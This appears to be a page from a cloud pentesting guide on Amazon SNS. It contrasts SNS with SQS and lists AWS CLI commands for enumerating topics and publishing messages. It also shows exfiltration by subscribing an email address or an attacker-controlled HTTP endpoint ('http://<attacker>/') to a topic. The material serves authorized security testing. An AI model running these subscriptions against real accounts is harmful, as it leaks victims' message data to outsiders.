## SNS

Amazon Simple Notification Service (Amazon SNS) is described as a **fully managed messaging service**. It supports both **application-to-application** (A2A) and **application-to-person** (A2P) communication types.

Key features for A2A communication include **publish/subscribe (pub/sub) mechanisms**. These mechanisms introduce **topics**, crucial for enabling high-throughput, **push-based, many-to-many messaging**. This feature is highly advantageous in scenarios that involve distributed systems, microservices, and event-driven serverless architectures. By leveraging these topics, publisher systems can efficiently distribute messages to a **wide range of subscriber systems**, facilitating a fanout messaging pattern.

### **Difference with SQS**

**SQS** is a **queue-based** service that allows point-to-point communication, ensuring that messages are processed by a **single consumer**. It offers **at-least-once delivery**, supports standard and FIFO queues, and allows message retention for retries and delayed processing.\
On the other hand, **SNS** is a **publish/subscribe-based service**, enabling **one-to-many** communication by broadcasting messages to **multiple subscribers** simultaneously. It supports **various subscription endpoints like email, SMS, Lambda functions, and HTTP/HTTPS**, and provides filtering mechanisms for targeted message delivery.\
While both services enable decoupling between components in distributed systems, SQS focuses on queued communication, and SNS emphasizes event-driven, fan-out communication patterns.

### **Enumeration**

```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
    --topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
    --message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
    --topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
    --protocol email \
    --notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
    --protocol http \
    --notification-endpoint http://<attacker>/ \
    --topic-arn <arn>
```

{% hint style="danger" %}
Note that if the **topic is of type FIFO**, only subscribers using the protocol **SQS** can be used (HTTP or HTTPS cannot be used).

Also, even if the `--topic-arn` contains the region make sure you specify the correct region in **`--region`** or you will get an error that looks like indicate that you don't have access but the problem is the region.
{% endhint %}
